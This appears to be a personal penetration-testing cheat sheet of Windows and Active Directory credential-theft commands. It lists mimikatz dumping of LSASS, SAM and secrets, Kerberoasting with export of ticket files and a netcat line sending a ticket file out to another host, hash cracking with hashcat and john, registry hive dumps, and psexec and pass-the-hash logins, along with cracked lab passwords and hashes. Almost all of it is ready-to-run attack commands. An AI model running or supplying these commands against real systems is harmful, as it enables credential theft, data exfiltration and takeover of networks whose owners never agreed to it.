DC

token::elevate
token::elevate /domainadmin
\\$IP\share\mimikatz.exe "token::elevate" exit
\\$IP\share\mimikatz.exe "token::elevate /domainadmin" exit
\\$IP\share\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
proxychains impacket-psexec sandbox.local/Administrator@10.5.5.30
> passwords

##  OLD Mimikatz binary

-   https://github.com/allandev5959/mimikatz-2.1.1

### Password DUMP USING SPNs    [AD]

>	PS C:\Users\nathan\Desktop> .\GetUserSPNs.ps1
>	Add-Type -AssemblyName System.IdentityModel
>   PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "FRIENDS-DC/svc_backups.FRIENDS.local:1337"
>   klist
-   C:> mimikatz.exe
>   # kerberos::list /export  
-   c:\Users\temp>dir /x
-   c:\Users\temp>nc.exe 192.168.119.195 80 < 1-40A1~1.KIR
>   __# kirbi2john svc_backup.kirbi > hash

-   └─# hashcat -m 13100 sql_kirbi_2_hash /opt/rockyou.txt
>   __# john hash --wordlist=/opt/rockyou.txt
>   __# hashcat hash /opt/rockyou.txt

>   [svc_backup:Password9]
>   [8c802621d2e36fc074345dded890f3e5]  `[Now we have either password or hash, let's go for login or PTH]`


### Password DUMP USING SAM/SYSTEM

-   C:\>reg save HKLM\SAM C:\sam
-   C:\>reg save HKLM\SYSTEM C:\system
-   impacket-secretsdump 'FRIENDS/svc_backup:Password9@192.168.159.149' 
-   hashcat -m 1000 'ntlm' /opt/rockyou

### Password DUMP USING Cached Credentials  [AD]

[+] imapcket / powershell mimikatz

-   mimikatz.exe
-   privilege::debug
-   sekurlsa::logonpasswords
--------------------------------
-   sekurlsa::logonpasswords
-   privilege::debug sekurlsa::logonpasswords
-   lsadump::sam
-   token::elevate lsadump::sam
-   lsadump::secrets
-   token::elevate lsadump::secrets
-   vault::cred
---------------------------------



impacket-psexec sqlServer:shantewhite@10.11.1.121


impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.217.78

impacket-psexec xor.com/david:Password@123@10.11.1.120


└─# pth-winexe -U xor.com/david%aad3c435b514a4eeaad3b935b51304f:d4738e8c31d43e0147f27894a20e6683 //10.11.1.120 cmd.exe

└─# pth-winexe -U xor.com/david%aad3c435b514a4eeaad3b935b51304f:d4738e8c31d43e0147f27894a20e6683 //10.11.1.120 cmd

--# pth-wmic -U xor.com/david%aad3c435b514a4eeaad3b935b51304f:d4738e8c31d43e0147f27894a20e6683 //10.11.1.120 cmd
